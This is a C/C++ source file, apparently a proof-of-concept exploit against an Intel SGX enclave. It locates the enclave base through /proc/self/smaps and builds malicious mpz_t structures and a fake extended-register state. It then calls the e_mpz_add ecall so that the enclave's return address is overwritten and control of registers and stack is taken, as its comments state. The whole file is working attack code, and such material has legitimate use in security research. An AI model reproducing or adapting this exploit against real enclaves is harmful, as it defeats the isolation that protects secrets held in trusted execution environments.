#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <link.h>

#include "sgx_edger8r.h" // sgx_ecall
#include "sgx_urts.h" // sgx_create_enclave

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

int initialize_enclave(const char* enclave_filename)
{
	if (global_eid != 0)
		return 0;

	sgx_launch_token_t token = {0};
	int updated;
	sgx_status_t ret = sgx_create_enclave(enclave_filename, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
	if (ret != SGX_SUCCESS)
		return -1;

	return 0;
}

void* enclave_base() {
	FILE* fp = fopen("/proc/self/smaps", "r");
	if (fp == 0) return 0;
	char* line = 0; size_t len = 0; ssize_t read;

	// first isgx page (CODE, r_x)
	while((read = getline(&line, &len, fp)) != -1)
		if (strstr(line, "isgx"))
			return (void*)strtoll(line, NULL, 16);
}

int call_ecall(int ecall_idx, void* ms)
{
	sgx_ecall(global_eid, ecall_idx, 0, ms);
}

int main(int argc, char** argv)
{
	if (initialize_enclave("enclave.signed.so") < 0)
		return -1;


	uint64_t enclave_addr = (uint64_t)enclave_base();

	static uint64_t b = 1;
	static uint64_t a = enclave_addr + 0x4ed23 - b; // BASE + asm_oret+13 - other_summand
	struct mpz_t { int alloc = 2; int size = 1; void* data; };

	static uint64_t xregs_restore[] = {
		0x37f, 0x0, 0x0, 0xffff00001f80,
		0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
		0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
		0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
		0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8000000000000000,
		0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // 0x240: end of systhetic state

		0x0, 0xdeadbeef, // 4. ret after asm_ret: all registers and stack under control
	};
	struct mpz_t_ext { int alloc = 2; int size = 1; void* data;
		char dummy[0x48] = { 0 };
		uint64_t rcx = (uint64_t)xregs_restore + 0x240;  // rsp+0x58 // 3. set rsp after asm_ret, must be near xregs_restore
		char dummy2[0x32] = { 0 };
		void* xregs = xregs_restore;  // rsp+0x98 // 2. set fake systhetic state for restore_xregs
	};

	static struct mpz_t_ext ma;
	static struct mpz_t mb, mc;
	ma.data = &a;
	mb.data = &b;
	mc.data = (void*) (enclave_addr + 0x1000000 + 0x3655b8); // 1. overwrite ret addr in ecall
	//mc.data = (void*) ((enclave_tcs & ~0xFFFFFF) + 0x362c28); // 1. overwrite ret addr in ecall

	printf("%p\n", mc.data);

	struct ms1_t { mpz_t* c = &mc; mpz_t_ext* a = &ma; mpz_t* b = &mb; };
	struct ms1_t ms1;
	call_ecall(1, (void*) &ms1); // e_mpz_add
}
